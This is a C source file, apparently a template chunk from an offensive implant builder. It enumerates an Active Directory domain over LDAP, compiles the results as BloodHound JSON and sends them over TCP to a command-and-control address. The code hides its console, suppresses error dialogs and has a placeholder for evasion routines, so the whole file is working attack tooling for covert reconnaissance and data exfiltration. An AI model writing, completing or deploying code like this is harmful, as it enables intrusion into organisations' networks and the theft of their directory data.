// chunk: arch/ad_recon
// depends: ad/json_builder, ad/ldap_client, ad/sid_resolver, ad_collectors/*
// provides: main
// note: AD recon — LDAP enumeration, BloodHound v6 JSON output via C2
// headers: winsock2.h, ws2tcpip.h
// libs: ws2_32

#ifndef CHUNK_ARCH_AD_RECON
#define CHUNK_ARCH_AD_RECON

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

#ifndef LDAP_USER
#define LDAP_USER "{{LDAP_USER}}"
#define LDAP_DOMAIN "{{LDAP_DOMAIN}}"
#define LDAP_PASS "{{LDAP_PASS}}"
#endif

static void ad_write_json_to_c2(const char *c2_addr, int c2_port) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return; }

    struct sockaddr_in sa;
    ZeroMemory(&sa, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons((u_short)c2_port);
    sa.sin_addr.s_addr = inet_addr(c2_addr);

    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    for (int t = 0; t < JB_COUNT; t++) {
        char *buf = NULL;
        DWORD len = 0;
        if (jb_finalize((jb_type_t)t, &buf, &len) > 0) {
            char hdr[128];
            wsprintfA(hdr, "===FILE:%s.json:%lu===", jb_type_names[t], len);
            send(sock, hdr, lstrlenA(hdr), 0);
            DWORD sent = 0;
            while (sent < len) {
                int chunk = (len - sent > 32768) ? 32768 : (int)(len - sent);
                int r = send(sock, buf + sent, chunk, 0);
                if (r <= 0) break;
                sent += r;
            }
        }
    }

    closesocket(sock);
    WSACleanup();
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    FreeConsole();
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

    jb_init();
    sid_cache_init();

    if (ad_ldap_init() != 0) {
        jb_cleanup();
        return 1;
    }

{{EVASION_INIT}}

    collect_domains();

{{COLLECTOR_CALLS}}

    ad_ldap_close();

    ad_write_json_to_c2(C2_ADDR, C2_PORT);

    jb_cleanup();
    return 0;
}

#endif
